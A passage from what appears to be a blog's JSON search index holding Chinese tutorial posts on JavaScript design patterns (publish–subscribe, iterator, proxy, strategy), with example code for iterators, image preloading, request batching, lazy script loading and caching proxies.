在提供最终的代码之前，我们来感受一下怎么使用这两个新增的功能。12345678910111213141516/************** 先 发 布 后 订 阅 ********************/ Event.trigger( 'click', 1 ); Event.listen( 'click', function( a )&#123; console.log( a ); // 输 出： 1 &#125;); /************** 使 用 命 名 空 间 ********************/ Event.create( 'namespace1' ).listen( 'click', function( a )&#123; console.log( a ); // 输 出： 1 &#125;); Event.create( 'namespace1' ).trigger( 'click', 1 );Event.create( 'namespace2' ).listen( 'click', function( a )&#123; console.log( a ); // 输 出： 2 &#125;); Event.create( 'namespace2' ).trigger( 'click', 2 ); 具体实现代码Event.js JavaScript实现发布－订阅模式的便利性这里要提出的是，我们一直讨论的发布—订阅模式，跟一些别的语言（比如Java）中的实现还是有区别的。在Java中实现一个自己的发布—订阅模式，通常会把订阅者对象自身当成引用传入发布者对象中，同时订阅者对象还需提供一个名为诸如update的方法，供发布者对象在适合的时候调用。而在JavaScript中，我们用注册回调函数的形式来代替传统的发布—订阅模式，显得更加优雅和简单。 另外，在JavaScript中，我们无需去选择使用推模型还是拉模型。推模型是指在事件发生时，发布者一次性把所有更改的状态和数据都推送给订阅者。拉模型不同的地方是，发布者仅仅通知订阅者事件已经发生了，此外发布者要提供一些公开的接口供订阅者来主动拉取数据。拉模型的好处是可以让订阅者“按需获取”，但同时有可能让发布者变成一个“门户大开”的对象，同时增加了代码量和复杂度。 刚好在JavaScript中，arguments可以很方便地表示参数列表，所以我们一般都会选择推模型，使用Function.prototype.apply方法把所有参数都推送给订阅者。 小结发布—订阅模式的优点非常明显，一为时间上的解耦，二为对象之间的解耦。它的应用非常广泛，既可以用在异步编程中，也可以帮助我们完成更松耦合的代码编写。发布—订阅模式还可以用来帮助实现一些别的设计模式，比如中介者模式。从架构上来看，无论是MVC还是MVVM，都少不了发布—订阅模式的参与，而且JavaScript本身也是一门基于事件驱动的语言。 当然，发布—订阅模式也不是完全没有缺点。创建订阅者本身要消耗一定的时间和内存，而且当你订阅一个消息后，也许此消息最后都未发生，但这个订阅者会始终存在于内存中。另外，发布—订阅模式虽然可以弱化对象之间的联系，但如果过度使用的话，对象和对象之间的必要联系也将被深埋在背后，会导致程序难以跟踪维护和理解。特别是有多个发布者和订阅者嵌套到一起的时候，要跟踪一个bug不是件轻松的事情。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"design pattern","slug":"design-pattern","permalink":"https://github.com/xmoyKING/tags/design-pattern/"}]},{"title":"JS设计模式-6-迭代器模式","slug":"js-pattern6","date":"2017-11-15T15:08:39.000Z","updated":"2017-12-06T14:50:09.336Z","comments":true,"path":"2017/11/15/js-pattern6/","link":"","permalink":"https://github.com/xmoyKING/2017/11/15/js-pattern6/","excerpt":"","text":"迭代器模式是指提供一种方法顺序访问一个聚合对象中的各个元素，而又不需要暴露该对象的内部表示。迭代器模式可以把迭代的过程从业务逻辑中分离出来，在使用迭代器模式之后，即使不关心对象的内部构造，也可以按顺序访问其中的每个元素。 目前，恐怕只有在一些“古董级”的语言中才会为实现一个迭代器模式而烦恼，现在流行的大部分语言如Java、Ruby等都已经有了内置的迭代器实现，许多浏览器也支持JavaScript的Array.prototype.forEach。 迭代器模式无非就是循环访问聚合对象中的各个元素。比如jQuery中的$.each函数，其中回调函数中的参数i为当前索引，n为当前元素，代码如下：1234$.each([1,2,3],function(i,n)&#123; console.log('当前下标为：'+i); console.log('当前值为:'+n);&#125;); ###实现自己的迭代器现在我们来自己实现一个each函数，each函数接受2个参数，第一个为被循环的数组，第二个为循环中的每一步后将被触发的回调函数：12345678var each=function(ary,callback)&#123; for(vari=0,l=ary.length;i&lt;l;i++)&#123; callback.call(ary[i],i,ary[i]);//把下标和元素当作参数传给callback函数 &#125;&#125;;each([1,2,3],function(i,n)&#123; alert([i,n]);&#125;); 内部迭代器和外部迭代器迭代器可以分为内部迭代器和外部迭代器，它们有各自的适用场景。 内部迭代器刚刚编写的each函数属于内部迭代器，each函数的内部已经定义好了迭代规则，它完全接手整个迭代过程，外部只需要一次初始调用。 内部迭代器在调用的时候非常方便，外界不用关心迭代器内部的实现，跟迭代器的交互也仅仅是一次初始调用，但这也刚好是内部迭代器的缺点。由于内部迭代器的迭代规则已经被提前规定，上面的each函数就无法同时迭代2个数组了。 比如现在有个需求，要判断2个数组里元素的值是否完全相等，如果不改写each函数本身的代码，我们能够入手的地方似乎只剩下each的回调函数了，代码如下：123456789101112var compare=function(ary1,ary2)&#123; if(ary1.length!==ary2.length)&#123; throw new Error('ary1和ary2不相等'); &#125; each(ary1,function(i,n)&#123; if(n!==ary2[i])&#123; throw new Error('ary1和ary2不相等'); &#125; &#125;); alert('ary1和ary2相等'); &#125;;compare([1,2,3],[1,2,4]);//thrownewError('ary1和ary2不相等'); 说实话，这个compare函数一点都算不上好看，我们目前能够顺利完成需求，还要感谢在JavaScript里可以把函数当作参数传递的特性，但在其他语言中未必就能如此幸运。在一些没有闭包的语言中，内部迭代器本身的实现也相当复杂。比如C语言中的内部迭代器是用函数指针来实现的，循环处理所需要的数据都要以参数的形式明确地从外面传递进去。 外部迭代器外部迭代器必须显式地请求迭代下一个元素。外部迭代器增加了一些调用的复杂度，但相对也增强了迭代器的灵活性，我们可以手工控制迭代的过程或者顺序。 下面这个外部迭代器的实现来自《松本行弘的程序世界》第4章，原例用Ruby写成，这里我们翻译成JavaScript：1234567891011121314151617181920212223var Iterator=function(obj)&#123; var current=0; var next=function()&#123;current+=1;&#125;; var isDone=function()&#123;returncurrent&gt;=obj.length;&#125;; var getCurrItem=function()&#123;returnobj[current];&#125;; return&#123;next:next,isDone:isDone,getCurrItem:getCurrItem&#125;&#125;;// 改写compare函数：var compare = function( iterator1, iterator2 )&#123; while( !iterator1.isDone() &amp;&amp; !iterator2.isDone() )&#123; if ( iterator1.getCurrItem() !== iterator2.getCurrItem() )&#123; throw new Error( 'iterator1 和 iterator2 不 相 等' ); &#125; iterator1.next(); iterator2.next(); &#125; alert( 'iterator1 和 iterator2 相 等' ); &#125; var iterator1 = Iterator( [ 1, 2, 3 ] ); var iterator2 = Iterator( [ 1, 2, 3 ] ); 外部迭代器虽然调用方式相对复杂，但它的适用面更广，也能满足更多变的需求。内部迭代器和外部迭代器在实际生产中没有优劣之分，究竟使用哪个要根据需求场景而定。 迭代类数组对象和字面量对象迭代器模式不仅可以迭代数组，还可以迭代一些类数组的对象。比如arguments、{“0”:’a’,”1”:’b’}等。通过上面的代码可以观察到，无论是内部迭代器还是外部迭代器，只要被迭代的聚合对象拥有length属性而且可以用下标访问，那它就可以被迭代。 在JavaScript中，for in语句可以用来迭代普通字面量对象的属性。jQuery中提供了$.each函数来封装各种迭代行为：1234567891011121314151617181920$.each = function( obj, callback ) &#123; var value, i = 0, length = obj.length, isArray = isArraylike( obj ); if ( isArray ) &#123; // 迭 代 类 数 组 for ( ; i &lt; length; i ++ ) &#123; value = callback.call( obj[ i ], i, obj[ i ] ); if ( value === false ) &#123; break; &#125; &#125; &#125; else &#123; for ( i in obj ) &#123; // 迭 代 object 对 象 value = callback.call( obj[ i ], i, obj[ i ] ); if ( value === false ) &#123; break; &#125; &#125; &#125; return obj; &#125;; 倒序迭代器由于GoF中对迭代器模式的定义非常松散，所以我们可以有多种多样的迭代器实现。总的来说，迭代器模式提供了循环访问一个聚合对象中每个元素的方法，但它没有规定我们以顺序、倒序还是中序来循环遍历聚合对象。 中止迭代器迭代器可以像普通for循环中的break一样，提供一种跳出循环的方法。jQuery的each函数里有这样一句：if(value === false){break;}这句代码的意思是，约定如果回调函数的执行结果返回false，则提前终止循环。下面我们把之前的each函数改写一下：123456789101112var each = function( ary, callback )&#123; for ( var i = 0, l = ary.length; i &lt; l; i++ )&#123; if ( callback( i, ary[ i ] ) === false )&#123; // callback 的 执 行 结 果 返 回 false， 提 前 终 止 迭 代 break; &#125; &#125; &#125;; each( [ 1, 2, 3, 4, 5 ], function( i, n )&#123; if ( n &gt; 3 )&#123; // n 大 于 3 的 时 候 终 止 循 环 return false; &#125;);console.log( n ); // 分 别 输 出： 1, 2, 3 迭代器模式的应用举例某个项目中文件上传模块的代码，它的目的是根据不同的浏览器获取相应的上传组件对象：12345678910111213var getUploadObj = function()&#123; try&#123; return new ActiveXObject(\"TXFTNActiveX.FTNUpload\"); // IE 上 传 控 件 &#125;catch( e)&#123; if ( supportFlash() )&#123; // supportFlash 函 数 未 提 供 var str = '&lt;object type=\" application/x-shockwave-flash\" &gt; &lt;/object&gt;'; return $( str ). appendTo( $('body') ); &#125;else&#123; var str = '&lt;input name=\" file\" type=\" file\" /&gt;'; // 表 单 上 传 return $( str ).appendTo( $('body') ); &#125; &#125; &#125;; 在不同的浏览器环境下，选择的上传方式是不一样的。因为使用浏览器的上传控件进行上传速度快，可以暂停和续传，所以我们首先会优先使用控件上传。如果浏览器没有安装上传控件，则使用Flash上传，如果连Flash也没安装，那就只好使用浏览器原生的表单上传了。 看看上面的代码，为了得到一个upload对象，这个getUploadObj函数里面充斥了try，catch以及if条件分支。缺点是显而易见的。第一是很难阅读，第二是严重违反开闭原则。在开发和调试过程中，我们需要来回切换不同的上传方式，每次改动都相当痛苦。后来我们还增加支持了一些另外的上传方式，比如，HTML5上传，这时候唯一的办法是继续往getUploadObj函数里增加条件分支。 现在来梳理一下问题，目前一共有3种可能的上传方式，我们不知道目前正在使用的浏览器支持哪几种。就好比我们有一个钥匙串，其中共有3把钥匙，我们想打开一扇门但是不知道该使用哪把钥匙，于是从第一把钥匙开始，迭代钥匙串进行尝试，直到找到了正确的钥匙为止。 同样，我们把每种获取upload对象的方法都封装在各自的函数里，然后使用一个迭代器，迭代获取这些upload对象，直到获取到一个可用的为止：1234567891011121314151617181920var getActiveUploadObj = function()&#123; try&#123; return new ActiveXObject(\"TXFTNActiveX.FTNUpload\" ); // IE 上 传 控 件 &#125;catch( e)&#123; return false; &#125; &#125;; var getFlashUploadObj = function()&#123; if ( supportFlash() )&#123; // supportFlash 函 数 未 提 供 var str = '&lt;object type=\"application/x-shockwave-flash\"&gt; &lt;/object&gt;'; return $( str ).appendTo( $('body') ); &#125; return false; &#125;;var getFormUpladObj = function()&#123; var str = '&lt;input name=\"file\" type=\"file\" /&gt;'; // 表 单 上 传 return $( str ).appendTo( $('body') ); &#125;; 在getActiveUploadObj、getFlashUploadObj、getFormUpladObj这3个函数中都有同一个约定：如果该函数里面的upload对象是可用的，则让函数返回该对象，反之返回false，提示迭代器继续往后面进行迭代。 所以我们的迭代器只需进行下面这几步工作。 提供一个可以被迭代的方法，使得getActiveUploadObj，getFlashUploadObj以及getFlashUploadObj依照优先级被循环迭代。 如果正在被迭代的函数返回一个对象，则表示找到了正确的upload对象，反之如果该函数返回false，则让迭代器继续工作。 迭代器代码如下：123456789var iteratorUploadObj = function()&#123; for ( var i = 0, fn; fn = arguments[ i++ ]; )&#123; var uploadObj = fn(); if ( uploadObj !== false )&#123; return uploadObj; &#125; &#125; &#125;;var uploadObj = iteratorUploadObj( getActiveUploadObj, getFlashUploadObj, getFormUpladObj ); 重构代码之后，我们可以看到，获取不同上传对象的方法被隔离在各自的函数里互不干扰，try、catch和if分支不再纠缠在一起，使得我们可以很方便地的维护和扩展代码。比如，后来我们又给上传项目增加了Webkit控件上传和HTML5上传，我们要做的仅仅是下面一些工作。 1.增加分别获取Webkit控件上传对象和HTML5上传对象的函数：123456var getWebkitUploadObj = function()&#123; // 具 体 代 码 略 &#125;; var getHtml5UploadObj = function()&#123; // 具 体 代 码 略 &#125;; 2.依照优先级把它们添加进迭代器：1var uploadObj = iteratorUploadObj( getActiveUploadObj, getWebkitUploadObj, getFlashUploadObj, getHtml5UploadObj, getFormUpladObj ); 迭代器模式是一种相对简单的模式，简单到很多时候我们都不认为它是一种设计模式。目前的绝大部分语言都内置了迭代器。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"design pattern","slug":"design-pattern","permalink":"https://github.com/xmoyKING/tags/design-pattern/"}]},{"title":"JS设计模式-5-代理模式","slug":"js-pattern5","date":"2017-11-12T14:13:53.000Z","updated":"2017-12-06T14:50:09.336Z","comments":true,"path":"2017/11/12/js-pattern5/","link":"","permalink":"https://github.com/xmoyKING/2017/11/12/js-pattern5/","excerpt":"","text":"代理模式是为一个对象提供一个代用品或占位符，以便控制对它的访问。 代理模式是一种非常有意义的模式，在生活中可以找到很多代理模式的场景。比如，明星都有经纪人作为代理。如果想请明星来办一场商业演出，只能联系他的经纪人。经纪人会把商业演出的细节和报酬都谈好之后，再把合同交给明星签。 代理模式的关键是，当客户不方便直接访问一个对象或者不满足需要的时候，提供一个替身对象来控制对这个对象的访问，客户实际上访问的是替身对象。替身对象对请求做出一些处理之后，再把请求转交给本体对象。 熟悉代理模式结构下面从一个小例子开始熟悉代理模式的结构：小明遇见了他的女神A。两天之后，小明决定给A送一束花来表白。刚好小明打听到A和他有一个共同的朋友B，于是内向的小明决定让B来代替自己完成送花这件事情。123456789101112var Flower = function()&#123;&#125;; var xiaoming = &#123; sendFlower: function( target)&#123; var flower = new Flower(); target.receiveFlower( flower ); &#125; &#125;; var B = &#123; receiveFlower: function( flower )&#123; A.receiveFlower( flower ); &#125; &#125;; var A = &#123; receiveFlower: function( flower )&#123; console.log( '收 到 花 ' + flower ); &#125; &#125;; xiaoming.sendFlower( B ); 现在我们改变故事的背景设定，假设当A在心情好的时候收到花，小明表白成功的几率有60%，而当A在心情差的时候收到花，小明表白的成功率无限趋近于0。A的朋友B很了解A，所以小明只管把花交给B，B会监听A的心情变化，然后选择A心情好的时候把花转交给A，代码如下：1234567891011121314151617181920212223242526var Flower = function()&#123;&#125;; var xiaoming = &#123; sendFlower: function( target)&#123; var flower = new Flower(); target.receiveFlower( flower ); &#125; &#125;; var B = &#123; receiveFlower: function( flower )&#123; A.listenGoodMood( function()&#123; // 监 听 A 的 好 心 情 A.receiveFlower( flower ); &#125;); &#125; &#125;; var A = &#123; receiveFlower: function( flower )&#123; console.log( '收 到 花 ' + flower ); &#125;, listenGoodMood: function( fn )&#123; setTimeout( function()&#123; // 假 设 10 秒 之 后 A 的 心 情 变 好 fn(); &#125;, 10000 ); &#125; &#125;; xiaoming.sendFlower( B ); 虽然这只是个虚拟的例子，但我们可以从中找到两种代理模式的身影。代理B可以帮助A过滤掉一些请求，比如送花的人中年龄太大的或者没有宝马的，这种请求就可以直接在代理B处被拒绝掉。这种代理叫作保护代理。A和B一个充当白脸，一个充当黑脸。白脸A继续保持良好的女神形象，不希望直接拒绝任何人，于是找了黑脸B来控制对A的访问。另外，假设现实中的花价格不菲，导致在程序世界里，newFlower也是一个代价昂贵的操作，那么我们可以把newFlower的操作交给代理B去执行，代理B会选择在A心情好时再执行newFlower，这是代理模式的另一种形式，叫作虚拟代理。虚拟代理把一些开销很大的对象，延迟到真正需要它的时候才去创建。代码如下：12345678var B = &#123; receiveFlower: function( flower )&#123; A.listenGoodMood( function()&#123; // 监 听 A 的 好 心 情 var flower = new Flower(); // 延 迟 创 建 flower 对 象 A.receiveFlower( flower ); &#125;); &#125;&#125;; 保护代理用于控制不同权限的对象对目标对象的访问，但在JavaScript并不容易实现保护代理，因为我们无法判断谁访问了某个对象。而虚拟代理是最常用的一种代理模式，主要讨论的也是虚拟代理。 虚拟代理实现图片预加载在Web开发中，图片预加载是一种常用的技术，如果直接给某个img标签节点设置src属性，由于图片过大或者网络不佳，图片的位置往往有段时间会是一片空白。常见的做法是先用一张loading图片占位，然后用异步的方式加载图片，等图片加载好了再把它填充到img节点里，这种场景就很适合使用虚拟代理。实现这个虚拟代理，首先创建一个普通的本体对象，这个对象负责往页面中创建一个img标签，并且提供一个对外的setSrc接口，外界调用这个接口，便可以给该img标签设置src属性：12345678var myImage = (function()&#123; var imgNode = document.createElement( 'img' ); document.body.appendChild( imgNode ); return &#123; setSrc: function( src )&#123; imgNode.src = src; &#125; &#125; &#125;)(); myImage.setSrc( 'aaa.jpg' ); 把网速调至5KB/s，然后通过MyImage.setSrc给该img节点设置src，可以看到，在图片被加载好之前，页面中有一段长长的空白时间。 现在开始引入代理对象proxyImage，通过这个代理对象，在图片被真正加载好之前，页面中将出现一张占位的菊花图loading.gif,来提示用户图片正在加载。代码如下：12345678910111213141516171819var myImage = (function()&#123; var imgNode = document.createElement( 'img' ); document.body.appendChild( imgNode ); return &#123; setSrc: function( src )&#123; imgNode.src = src; &#125; &#125; &#125;)(); var proxyImage = (function()&#123; var img = new Image; img.onload = function()&#123; myImage.setSrc( this.src ); &#125; return &#123; setSrc: function( src )&#123; myImage.setSrc( 'loading.gif' ); img.src = src; &#125; &#125; &#125;)(); proxyImage.setSrc( 'Nk.jpg' ); 通过proxyImage间接地访问MyImage。proxyImage控制了客户对MyImage的访问，并且在此过程中加入一些额外的操作，比如在真正的图片加载好之前，先把img节点的src设置为一张本地的loading图片。 ####代理的意义不过是实现一个小小的图片预加载功能，即使不需要引入任何模式也能办到，那么引入代理模式的好处究竟在哪里呢？下面我们先抛开代理，编写一个更常见的图片预加载函数。不用代理的预加载图片函数实现如下：123456789101112131415var MyImage = (function()&#123; var imgNode = document.createElement( 'img' ); document.body.appendChild( imgNode ); var img = new Image; img.onload = function()&#123; imgNode.src = img.src; &#125;; return &#123; setSrc: function( src )&#123; imgNode.src = 'loading.gif'; img.src = src; &#125; &#125; &#125;)(); MyImage.setSrc( 'Nk.jpg' ); 为了说明代理的意义，下面我们引入一个面向对象设计的原则——单一职责原则。单一职责原则指的是，就一个类（通常也包括对象和函数等）而言，应该仅有一个引起它变化的原因。如果一个对象承担了多项职责，就意味着这个对象将变得巨大，引起它变化的原因可能会有多个。面向对象设计鼓励将行为分布到细粒度的对象之中，如果一个对象承担的职责过多，等于把这些职责耦合到了一起，这种耦合会导致脆弱和低内聚的设计。当变化发生时，设计可能会遭到意外的破坏。职责被定义为“引起变化的原因”。上段代码中的MyImage对象除了负责给img节点设置src外，还要负责预加载图片。我们在处理其中一个职责时，有可能因为其强耦合性影响另外一个职责的实现。 另外，在面向对象的程序设计中，大多数情况下，若违反其他任何原则，同时将违反开放—封闭原则。如果我们只是从网络上获取一些体积很小的图片，或者5年后的网速快到根本不再需要预加载，我们可能希望把预加载图片的这段代码从MyImage对象里删掉。这时候就不得不改动MyImage对象了。实际上，我们需要的只是给img节点设置src，预加载图片只是一个锦上添花的功能。如果能把这个操作放在另一个对象里面，自然是一个非常好的方法。于是代理的作用在这里就体现出来了，代理负责预加载图片，预加载的操作完成之后，把请求重新交给本体MyImage。 纵观整个程序，我们并没有改变或者增加MyImage的接口，但是通过代理对象，实际上给系统添加了新的行为。这是符合开放—封闭原则的。给img节点设置src和图片预加载这两个功能，被隔离在两个对象里，它们可以各自变化而不影响对方。何况就算有一天我们不再需要预加载，那么只需要改成请求本体而不是请求代理对象即可。 代理和本体接口的一致性如果有一天我们不再需要预加载，那么就不再需要代理对象，可以选择直接请求本体。其中关键是代理对象和本体都对外提供了setSrc方法，在客户看来，代理对象和本体是一致的，代理接手请求的过程对于用户来说是透明的，用户并不清楚代理和本体的区别，这样做有两个好处。 用户可以放心地请求代理，他只关心是否能得到想要的结果。 在任何使用本体的地方都可以替换成使用代理。在Java等语言中，代理和本体都需要显式地实现同一个接口，一方面接口保证了它们会拥有同样的方法，另一方面，面向接口编程迎合依赖倒置原则，通过接口进行向上转型，从而避开编译器的类型检查，代理和本体将来可以被替换使用。在JavaScript这种动态类型语言中，我们有时通过鸭子类型来检测代理和本体是否都实现了setSrc方法，另外大多数时候甚至干脆不做检测，全部依赖程序员的自觉性，这对于程序的健壮性是有影响的。不过对于一门快速开发的脚本语言，这些影响还是在可以接受的范围内，而且我们也习惯了没有接口的世界。 另外值得一提的是，如果代理对象和本体对象都为一个函数（函数也是对象），函数必然都能被执行，则可以认为它们也具有一致的“接口”，代码如下：1234567891011121314151617var myImage = (function()&#123; var imgNode = document.createElement( 'img' ); document.body.appendChild( imgNode ); return function( src )&#123; imgNode.src = src; &#125; &#125;)(); var proxyImage = (function()&#123; var img = new Image; img.onload = function()&#123; myImage( this.src ); &#125; return function( src )&#123; myImage( 'loading.gif' ); img.src = src; &#125; &#125;)(); proxyImage( 'Nk.jpg' ); 虚拟代理合并HTTP请求先想象这样一个场景：每周我们都要写一份工作周报，周报要交给总监批阅。总监手下管理着150个员工，如果我们每个人直接把周报发给总监，那总监可能要把一整周的时间都花在查看邮件上面。现在我们把周报发给各自的组长，组长作为代理，把组内成员的周报合并提炼成一份后一次性地发给总监。这样一来，总监的邮箱便清净多了。 这个例子在程序世界里很容易引起共鸣，在Web开发中，也许最大的开销就是网络请求。假设我们在做一个文件同步的功能，当我们选中一个checkbox的时候，它对应的文件就会被同步到另外一台备用服务器上面，我们先在页面中放置好这些checkbox节点：1234567891011&lt;body&gt; &lt;input type=\"checkbox\" id=\"1\" /&gt;1 &lt;input type=\"checkbox\" id=\"2\" /&gt;2 &lt;input type=\"checkbox\" id=\"3\" /&gt;3 &lt;input type=\"checkbox\" id=\"4\" /&gt;4 &lt;input type=\"checkbox\" id=\"5\" /&gt;5 &lt;input type=\"checkbox\" id=\"6\" /&gt;6 &lt;input type=\"checkbox\" id=\"7\" /&gt;7 &lt;input type=\"checkbox\" id=\"8\" /&gt;8 &lt;input type=\"checkbox\" id=\"9\" /&gt;9&lt;/body&gt; 当我们选中3个checkbox的时候，依次往服务器发送了3次同步文件的请求。可以预见，如此频繁的网络请求将会带来相当大的开销。 解决方案是，我们可以通过一个代理函数proxySynchronousFile来收集一段时间之内的请求，最后一次性发送给服务器。比如我们等待2秒之后才把这2秒之内需要同步的文件ID打包发给服务器，如果不是对实时性要求非常高的系统，2秒的延迟不会带来太大副作用，却能大大减轻服务器的压力。代码如下：12345678910111213141516171819202122232425262728var synchronousFile = function( id )&#123; console.log( '开 始 同 步 文 件， id 为: ' + id );&#125;;var proxySynchronousFile = (function()&#123; var cache = [], // 保 存 一 段 时 间 内 需 要 同 步 的 ID timer; // 定 时 器 return function( id )&#123; cache.push( id ); if ( timer )&#123; // 保 证 不 会 覆 盖 已 经 启 动 的 定 时 器 return; &#125; timer = setTimeout( function()&#123; synchronousFile( cache.join( ',' ) ); // 2 秒 后 向 本 体 发 送 需 要 同 步 的 ID 集 合 clearTimeout( timer ); // 清 空 定 时 器 timer = null; cache.length = 0; // 清 空 ID 集 合 &#125;, 2000 ); &#125; &#125;)();var checkbox = document.getElementsByTagName( 'input' ); for ( var i = 0, c; c = checkbox[ i ++ ]; )&#123; c.onclick = function()&#123; if ( this.checked = = = true )&#123; proxySynchronousFile( this.id ); &#125; &#125; &#125;; 虚拟代理在惰性加载中的应用mini控制台的开源项目miniConsole.js，这个控制台可以帮助开发者在IE浏览器以及移动端浏览器上进行一些简单的调试工作。调用方式很简单：miniConsole.log(1);这句话会在页面中创建一个div，并且把log显示在div里面.miniConsole.js的代码量大概有1000行左右，也许我们并不想一开始就加载这么大的JS文件，因为也许并不是每个用户都需要打印log。我们希望在有必要的时候才开始加载它，比如当用户按下F2来主动唤出控制台的时候。在miniConsole.js加载之前，为了能够让用户正常地使用里面的API，通常我们的解决方案是用一个占位的miniConsole代理对象来给用户提前使用，这个代理对象提供给用户的接口，跟实际的miniConsole是一样的。 用户使用这个代理对象来打印log的时候，并不会真正在控制台内打印日志，更不会在页面中创建任何DOM节点。即使我们想这样做也无能为力，因为真正的miniConsole.js还没有被加载。 于是，我们可以把打印log的请求都包裹在一个函数里面，这个包装了请求的函数就相当于其他语言中命令模式中的Command对象。随后这些函数将全部被放到缓存队列中，这些逻辑都是在miniConsole代理对象中完成实现的。等用户按下F2唤出控制台的时候，才开始加载真正的miniConsole.js的代码，加载完成之后将遍历miniConsole代理对象中的缓存函数队列，同时依次执行它们。 当然，请求的到底是什么对用户来说是不透明的，用户并不清楚它请求的是代理对象，所以他可以在任何时候放心地使用miniConsole对象。 未加载真正的miniConsole.js之前的代码如下：12345678910var cache = []; var miniConsole = &#123; log: function()&#123; var args = arguments; cache.push( function()&#123; return miniConsole.log.apply( miniConsole, args ); &#125;); &#125; &#125;; miniConsole.log( 1); 当用户按下F2时，开始加载真正的miniConsole.js，代码如下：1234567891011121314151617181920var handler = function( ev )&#123; if ( ev.keyCode = = = 113 )&#123; var script = document.createElement( 'script' ); script.onload = function()&#123; for ( var i = 0, fn; fn = cache[ i ++ ]; )&#123; fn(); &#125; &#125;; script.src = 'miniConsole.js'; document.getElementsByTagName( 'head' )[0].appendChild( script ); &#125;&#125;;document.body.addEventListener( 'keydown', handler, false ); // miniConsole.js 代 码： miniConsole = &#123; log: function()&#123; // 真 正 代 码 略 console.log( Array.prototype.join.call( arguments ) ); &#125; &#125;; 虽然我们没有给出miniConsole.js的真正代码，但这不影响我们理解其中的逻辑。当然这里还要注意一个问题，就是我们要保证在F2被重复按下的时候，miniConsole.js只被加载一次。 缓存代理缓存代理可以为一些开销大的运算结果提供暂时的存储，在下次运算时，如果传递进来的参数跟之前一致，则可以直接返回前面存储的运算结果。 缓存代理的例子——计算乘积这里编写一个简单的求乘积的程序，请读者自行把它脑补为复杂的计算。先创建一个用于求乘积的函数：12345678910var mult = function()&#123; console.log( '开 始 计 算 乘 积' ); var a = 1; for ( var i = 0, l = arguments.length; i &lt; l; i ++ )&#123; a = a * arguments[ i]; &#125; return a; &#125;; mult( 2, 3 ); // 输 出： 6 mult( 2, 3, 4 ); // 输 出： 24 现在加入缓存代理函数：123456789101112var proxyMult = (function()&#123; var cache = &#123;&#125;; return function()&#123; var args = Array.prototype.join.call( arguments, ',' ); if ( args in cache )&#123; return cache[ args ]; &#125; return cache[ args ] = mult.apply( this, arguments ); &#125; &#125;)(); proxyMult( 1, 2, 3, 4 ); // 输 出： 24 proxyMult( 1, 2, 3, 4 ); // 输 出： 24 当我们第二次调用proxyMult(1,2,3,4)的时候，本体mult函数并没有被计算，proxyMult直接返回了之前缓存好的计算结果。通过增加缓存代理的方式，mult函数可以继续专注于自身的职责——计算乘积，缓存的功能是由代理对象实现的。 缓存代理用于ajax异步请求数据常常在项目中遇到分页的需求，同一页的数据理论上只需要去后台拉取一次，这些已经拉取到的数据在某个地方被缓存之后，下次再请求同一页的时候，便可以直接使用之前的数据。显然这里也可以引入缓存代理，实现方式跟计算乘积的例子差不多，唯一不同的是，请求数据是个异步的操作，我们无法直接把计算结果放到代理对象的缓存中，而是要通过回调的方式。 用高阶函数动态创建代理通过传入高阶函数这种更加灵活的方式，可以为各种计算方法创建缓存代理。现在这些计算方法被当作参数传入一个专门用于创建缓存代理的工厂中，这样一来，我们就可以为乘法、加法、减法等创建缓存代理，代码如下：12345678910111213141516171819202122232425262728293031323334/**************** 计 算 乘 积 *****************/ var mult = function()&#123; var a = 1; for ( var i = 0, l = arguments.length; i &lt; l; i ++ )&#123; a = a * arguments[ i]; &#125; return a; &#125;; /**************** 计 算 加 和 *****************/ var plus = function()&#123; var a = 0; for ( var i = 0, l = arguments.length; i &lt; l; i ++ )&#123; a = a + arguments[ i]; &#125; return a; &#125;; /**************** 创 建 缓 存 代 理 的 工 厂 *****************/ var createProxyFactory = function( fn )&#123; var cache = &#123;&#125;; return function()&#123; var args = Array.prototype.join.call( arguments, ',' ); if ( args in cache )&#123; return cache[ args ]; &#125; return cache[ args ] = fn.apply( this, arguments ); &#125; &#125;; var proxyMult = createProxyFactory( mult ), proxyPlus = createProxyFactory( plus ); alert( proxyMult( 1, 2, 3, 4 ) ); // 输 出： 24 alert( proxyMult( 1, 2, 3, 4 ) ); // 输 出： 24 alert( proxyPlus( 1, 2, 3, 4 ) ); // 输 出： 10 alert( proxyPlus( 1, 2, 3, 4 ) ); // 输 出： 10 其他代理模式代理模式的变体种类非常多，简约介绍一下这些代理， 防火墙代理：控制网络资源的访问，保护主题不让“坏人”接近。 远程代理：为一个对象在不同的地址空间提供局部代表，在Java中，远程代理可以是另一个虚拟机中的对象。 保护代理：用于对象应该有不同访问权限的情况。 智能引用代理：取代了简单的指针，它在访问对象时执行一些附加操作，比如计算一个对象被引用的次数。 写时复制代理：通常用于复制一个庞大对象的情况。写时复制代理延迟了复制的过程，当对象被真正修改时，才对它进行复制操作。写时复制代理是虚拟代理的一种变体，DLL（操作系统中的动态链接库）是其典型运用场景。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"design pattern","slug":"design-pattern","permalink":"https://github.com/xmoyKING/tags/design-pattern/"}]},{"title":"JS设计模式-4-策略模式","slug":"js-pattern4","date":"2017-11-08T15:24:37.000Z","updated":"2017-12-06T14:50:09.336Z","comments":true,"path":"2017/11/08/js-pattern4/","link":"","permalink":"https://github.com/xmoyKING/2017/11/08/js-pattern4/","excerpt":"","text":"策略模式的定义是：定义一系列的算法，把它们一个个封装起来，并且使它们可以相互替换。 策略模式有着广泛的应用。以年终奖的计算为例进行介绍。很多公司的年终奖是根据员工的工资基数和年底绩效情况来发放的。例如，绩效为S的人年终奖有4倍工资，绩效为A的人年终奖有3倍工资，而绩效为B的人年终奖是2倍工资。假设财务部要求我们提供一段代码，来方便他们计算员工的年终奖。 1.最初的代码实现我们可以编写一个名为calculateBonus的函数来计算每个人的奖金数额。很显然，calculateBonus函数要正确工作，就需要接收两个参数：员工的工资数额和他的绩效考核等级。代码如下：12345678var calculateBonus = function( performanceLevel, salary )&#123; if ( performanceLevel === 'S' )&#123; return salary * 4; &#125; if ( performanceLevel === 'A' )&#123; return salary * 3; &#125; if ( performanceLevel === 'B' )&#123; return salary * 2; &#125; &#125;; calculateBonus( 